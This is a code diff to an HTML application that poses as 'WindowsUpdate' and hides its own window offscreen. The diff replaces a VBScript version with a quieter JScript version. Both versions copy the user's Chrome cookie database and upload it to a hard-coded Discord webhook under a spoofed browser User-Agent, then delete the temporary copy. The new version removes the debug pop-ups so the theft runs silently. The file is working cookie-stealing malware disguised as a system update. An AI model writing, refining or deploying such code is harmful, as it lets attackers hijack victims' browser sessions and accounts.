@@ -1,79 +1,78 @@
 <html>
 <head>
 <hta:application id="oHTA" applicationname="WindowsUpdate" border="none" caption="no" showintaskbar="no" scroll="no" windowstate="minimize" />
-<script language="VBScript">
-Sub Window_OnLoad
-    window.resizeTo 0,0
-    window.moveTo -2000,-2000
-    On Error Resume Next ' THIS PREVENTS SILENT CRASHES
-    
-    Set shell = CreateObject("WScript.Shell")
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set http = CreateObject("MSXML2.XMLHTTP")
-    Set ado = CreateObject("ADODB.Stream")
-    
-    userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
-    cookiesPath = userProfile & "\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-    
-    webhook = "https://discord.com/api/webhooks/1557537274613469307/QDbmzYDUHRCzK_7OQMXsibxACoABgfSkBkBxIqh4NXh6OPYPZEBDm7NznEl8mLTxPRwE"
-    tempCookies = shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp"
-    
-    If fso.FileExists(cookiesPath) Then
-        fso.CopyFile cookiesPath, tempCookies, True
-        
-        If Err.Number <> 0 Then
-            MsgBox "Copy Failed: " & Err.Description
-            window.close
-            Exit Sub
-        End If
-        
-        ado.Type = 1
-        ado.Open
-        ado.LoadFromFile tempCookies
-        fileData = ado.Read
-        ado.Close
-        
-        boundary = "---------------------------Boundary"
-        body = "--" & boundary & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""cookies.db""" & vbCrLf & "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
-        
-        Set ado = CreateObject("ADODB.Stream")
-        ado.Type = 1
-        ado.Open
-        ado.Write TextToBytes(body)
-        ado.Write fileData
-        ado.Write TextToBytes(vbCrLf & "--" & boundary & "--" & vbCrLf)
-        
-        http.Open "POST", webhook, False
-        http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
-        http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-        http.Send ado.Read
-        
-        If Err.Number <> 0 Then
-            MsgBox "HTTP Send Failed: " & Err.Description
-        Else
-            MsgBox "Success! File sent to Discord."
-        End If
-        
-        ado.Close
-        fso.DeleteFile tempCookies
-    Else
-        MsgBox "File not found at: " & cookiesPath
-    End If
-    
-    window.close
-End Sub
+<script language="JScript">
+window.resizeTo(0,0);
+window.moveTo(-2000,-2000);
 
-Function TextToBytes(str)
-    Set s = CreateObject("ADODB.Stream")
-    s.Type = 2
-    s.Charset = "utf-8"
-    s.Open
-    s.WriteText str
-    s.Position = 0
-    s.Type = 1
-    TextToBytes = s.Read
-    s.Close
-End Function
+var webhook = "https://discord.com/api/webhooks/1557537274613469307/QDbmzYDUHRCzK_7OQMXsibxACoABgfSkBkBxIqh4NXh6OPYPZEBDm7NznEl8mLTxPRwE";
+var shell = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var ado = new ActiveXObject("ADODB.Stream");
+
+var userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%");
+var cookiesPath = userProfile + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
+var tempCookies = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ck.tmp";
+
+if (fso.FileExists(cookiesPath)) {
+    try {
+        fso.CopyFile(cookiesPath, tempCookies, true);
+    } catch(e) {
+        // fails if chrome is locking the file, script ends silently
+        window.close();
+    }
+
+    var fileData = "";
+    try {
+        ado.Type = 1; // Binary
+        ado.Open();
+        ado.LoadFromFile(tempCookies);
+        fileData = ado.Read();
+        ado.Close();
+    } catch(e) {
+        window.close();
+    }
+
+    var boundary = "---------------------------VantaBoundary";
+    var headStr = "--" + boundary + "\r\n" +
+                  "Content-Disposition: form-data; name=\"file\"; filename=\"cookies.db\"\r\n" +
+                  "Content-Type: application/octet-stream\r\n\r\n";
+    var footStr = "\r\n--" + boundary + "--\r\n";
+
+    // Convert strings to binary safely
+    function StrToByte(str) {
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.Type = 2; // Text
+        stream.Charset = "utf-8";
+        stream.Open();
+        stream.WriteText(str);
+        stream.Position = 0;
+        stream.Type = 1; // Binary
+        var b = stream.Read();
+        stream.Close();
+        return b;
+    }
+
+    var payloadStream = new ActiveXObject("ADODB.Stream");
+    payloadStream.Type = 1;
+    payloadStream.Open();
+    payloadStream.Write(StrToByte(headStr));
+    payloadStream.Write(fileData);
+    payloadStream.Write(StrToByte(footStr));
+    
+    var http = new ActiveXObject("MSXML2.XMLHTTP");
+    http.Open("POST", webhook, false);
+    http.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
+    http.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+    
+    try {
+        http.Send(payloadStream.Read());
+    } catch(e) {}
+    
+    payloadStream.Close();
+    fso.DeleteFile(tempCookies);
+}
+window.close();
 </script>
 </head>
 <body></body>
